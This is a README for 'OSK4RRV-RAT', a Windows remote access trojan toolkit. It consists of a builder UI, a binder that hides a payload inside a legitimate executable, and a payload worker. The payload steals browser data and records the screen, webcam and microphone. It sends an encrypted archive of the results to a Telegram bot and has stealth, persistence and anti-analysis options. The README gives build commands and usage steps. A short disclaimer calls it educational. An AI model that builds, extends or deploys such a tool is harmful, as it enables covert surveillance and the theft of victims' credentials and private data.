# OSK4RRV-RAT

```
   ___  ____  _  _  _  _  ____  ____  ____  _  _       ____   __  ____ 
  /  _)/ ___)/ )/ )/ )/ )(  _ \(  _ \(  _ \/ )( \     (  _ \ / _\(_  _)
 (  (  \___ \)  (  \  /  )   / )   / )   /) \/ (      )   //    \ )(  
  \__) (____/\_)_)  \/  (__\_)(__\_)(__\_)\____/     (__\_)\_/\_/(__) 
```

**Windows builder + binder + payload toolkit** with a premium ImGui (DX11) control panel.

> Educational / research project. Use only on systems you own or have explicit permission to test.

---

## Overview

| Component | Binary | Role |
|-----------|--------|------|
| **Builder** | `OSK4RRV-RAT.exe` | GUI — configure features, Telegram, bind original EXE |
| **Binder** | `binder.exe` | Stub that drops & launches original + payload |
| **Payload** | `payload.exe` | Worker — collection, capture, Telegram delivery |

```
┌─────────────┐     build      ┌──────────────────┐
│  Builder UI │ ─────────────► │  bound.exe       │
│  (ImGui)    │                │  (binder + data) │
└─────────────┘                └────────┬─────────┘
                                        │ run
                         ┌──────────────┼──────────────┐
                         ▼              ▼              ▼
                   original.exe    payload.exe    config.ini
```

---

## Features

### Builder
- Dark / champagne-gold ImGui UI (splash + main window)
- Feature toggles & capture durations
- Telegram bot token / chat ID setup + connection test
- Bind any original EXE (icon / name preserved when possible)
- Admin elevation for the builder and bound stub

### Payload (configurable)
- Browser data export (Chromium family + Firefox profiles)
- Screenshot (PNG) & multi-monitor screen recording
- Webcam capture (ffmpeg dshow + VFW fallback)
- Multi-device microphone recording
- Telegram hit message + encrypted archive delivery
- Optional stealth / persistence / anti-analysis switches

---

## Requirements

| Tool | Notes |
|------|--------|
| **Windows 10/11** x64 | Target platform |
| **Visual Studio 2022** | C++ desktop workload + MSVC |
| **CMake ≥ 3.20** | Generator: Visual Studio 17 2022 |
| **ffmpeg** (optional) | Better webcam / screen / mic capture if on `PATH` or common install paths |

---

## Build

```powershell
# From repo root
cmake -S . -B build -G "Visual Studio 17 2022" -A x64
cmake --build build --config Release
```

**Outputs**

```
build/Release/OSK4RRV-RAT.exe   # builder UI
build/Release/binder.exe        # binder stub
build/Release/payload.exe       # payload worker
```

Run the builder as administrator (manifest requires elevation).

---

## Project layout

```
osk4rrvrat/
├── CMakeLists.txt
├── assets/                 # fonts / UI assets
├── src/
│   ├── main.cpp            # builder UI (ImGui + DX11)
│   ├── rat.cpp / rat.h     # Telegram helpers (builder)
│   ├── binder.cpp          # extract + launch original/payload
│   ├── payload.cpp         # collection & delivery
│   ├── app.manifest
│   └── Dear Imgui/         # Dear ImGui sources
└── build/                  # CMake / MSVC output (local)
```

---

## Usage (high level)

1. Build all three targets (`Release`).
2. Start **OSK4RRV-RAT**.
3. Set **Telegram** bot token + chat ID and verify.
4. Open **Build** → pick original EXE → enable options → build.
5. Run the produced bound executable on a machine you control.

Payload writes a local `result/` dump in debug/CLI flows and can send an archive over Telegram when credentials are set.

---

## Configuration notes

- **Payload** runs as `asInvoker` so user-context DPAPI for browsers can work.
- **Binder / builder** use `requireAdministrator`.
- Capture quality depends on available devices and whether **ffmpeg** is installed.
- Keep bot tokens out of public forks — treat them as secrets.

---

## Tech stack

- **C++20** · **Win32** · **DirectX 11** · **Dear ImGui**
- **WinHTTP** (Telegram API)
- **GDI+ / VFW / waveIn** (+ optional **ffmpeg**)
- **CMake** + **MSVC**

---

## License

See [LICENSE](./LICENSE).

---

<p align="center">
  <sub>OSK4RRV-RAT · built for controlled research environments</sub>
</p>
